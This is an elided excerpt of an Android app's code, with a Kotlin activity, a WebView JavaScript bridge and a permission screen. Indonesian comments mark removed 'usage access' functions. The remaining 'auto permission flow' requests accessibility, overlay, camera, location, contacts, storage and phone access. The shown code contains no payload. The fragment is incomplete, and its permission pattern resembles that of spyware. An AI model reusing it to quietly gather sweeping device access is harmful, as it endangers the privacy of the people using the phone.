...
class MainActivity : AppCompatActivity() {
    ...
    // FUNGSI USAGE ACCESS DIHAPUS - TIDAK ADA LAGI

    fun requestAccessibilityPerm() {
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    // FUNGSI REQUEST USAGE ACCESS DIHAPUS - TIDAK ADA LAGI
...
<div class="screen" id="permScreen">
  ...
  <div class="perm-list" id="permList">
    ...
    <!-- BARIS USAGE ACCESS TELAH DIHAPUS -->
...
<script>
// PERM_IDS TELAH DIHAPUS 'usage'
const permIds = ['cam','bat','overlay','accessibility','gallery','location','gpson','contacts','storage','phone']
...
function refreshPerms() {
  ...
  const state = {
    ...
    // usage:      Android.isUsageAccessGranted(),  // DIHAPUS
...
// AUTO PERMISSION FLOW - TANPA 'usage'
const autoPermList = [
...
class AppBridge(private val context: Context, private val webView: WebView) {
    ...
    // FUNGSI isUsageAccessGranted DIHAPUS
    ...
    // FUNGSI requestUsageAccessPerm DIHAPUS
